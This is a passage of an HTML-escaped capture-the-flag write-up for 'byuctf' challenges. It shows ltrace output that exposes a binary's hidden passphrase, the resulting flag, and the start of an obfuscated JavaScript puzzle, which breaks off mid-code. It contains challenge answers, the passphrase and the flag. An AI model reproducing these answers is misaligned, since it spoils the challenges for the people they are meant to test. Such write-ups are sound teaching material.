&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strcspn&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1234\n&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\n&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)                                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;4
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strcmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1234&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;She turned me into a newt&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;-34
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;puts&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Incorrect passphrase. Please try&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...Incorrect passphrase. Please try again.
&lt;&#x2F;span&gt;&lt;span&gt;)            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;+++&lt;&#x2F;span&gt;&lt;span&gt; exited (status 0) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;+++
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@Linux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;reveng$&lt;&#x2F;span&gt;&lt;span&gt; .&#x2F;gettingBetter 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Please&lt;&#x2F;span&gt;&lt;span&gt; enter the correct passphrase to get the flag:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Congratulations!&lt;&#x2F;span&gt;&lt;span&gt; The flag is byuctf{i_G0t_3etTeR!_1975}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Yeahh, The test password &lt;code&gt;1234&lt;&#x2F;code&gt; was compared with &lt;code&gt;She turned me into a new&lt;&#x2F;code&gt;. So passing this strings as passphrase will give us the flag.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : byuctf{i_G0t_3etTeR!_1975}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;obfuscjstor&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#obfuscjstor&quot; aria-label=&quot;Anchor link for: obfuscjstor&quot;&gt;obfuscJStor&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;Description :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Obfuscated JavaScript?? Really??
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached file : [obfuscJStor.js]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x12de&lt;&#x2F;span&gt;&lt;span&gt;(){&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;_0x6ab222&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x2e\x69\x6f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x75\x73\x63\x61\x74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x37\x32\x4f\x4f\x6e\x7a\x73\x4d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x61\x5f\x74\x6f\x6f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x6c\x6f\x67&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x62\x79\x75\x63\x74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x32\x30\x35\x38\x31\x31\x31\x56\x73\x4a\x6d\x4e\x74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x64\x61\x79\x73\x5f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x35\x62\x6b\x68\x53\x6b\x77&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x36\x32\x37\x38\x77\x53\x77\x45\x56\x49&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x31\x32\x35\x33\x31\x33\x30\x78\x4e\x74\x74\x57\x77&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x48\x6d\x6d\x6d\x6d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x6c\x5f\x74\x6f\x5f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x77\x68\x65\x72\x65&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x66\x6c\x61\x67\x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x34\x31\x30\x35\x39\x34\x34\x58\x71\x67\x53\x54\x64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x31\x30\x69\x47\x78\x53\x78\x74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x35\x33\x4d\x50\x56\x43\x43\x73&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x63\x61\x74\x6f\x72&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x6d\x61\x6b\x65\x5f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x6f\x62\x66\x75\x73&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x32\x35\x34\x30\x30\x39\x74\x71\x59\x51\x79\x6b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x35\x31\x30\x35\x30\x31\x46\x57\x64\x52\x56\x71&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x66\x7b\x6f\x6e\x65&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x64\x65\x6f\x62\x66&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x68\x65\x73\x65\x5f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x5f\x6f\x66\x5f\x74&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x31\x37\x32\x36\x34\x35\x6f\x6b\x76\x58\x66\x70&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x69\x73\x3f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x34\x6d\x6f\x71\x49\x6c\x56&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x12de&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span&gt;(){&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;_0x6ab222&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x12de&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span&gt;}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_0x2a4cef&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_0x9e205&lt;&#x2F;span&gt;&lt;span&gt;){&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;_0x2a7d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;_0x40cc8a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x2a4cef&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!!&lt;&#x2F;span&gt;&lt;span&gt;[]){&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;_0x2d47a2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f1&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x207&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f6&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x3&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1fd&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x4&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x206&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x208&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x6&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f5&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x200&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x8&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x204&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1f0&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xa&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1fb&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;parseInt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_0x539a11&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x1ef&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(_0x2d47a2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;===&lt;&#x2F;span&gt;&lt;span&gt;_0x9e205)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;&lt;&#x2F;span&gt;&lt;span 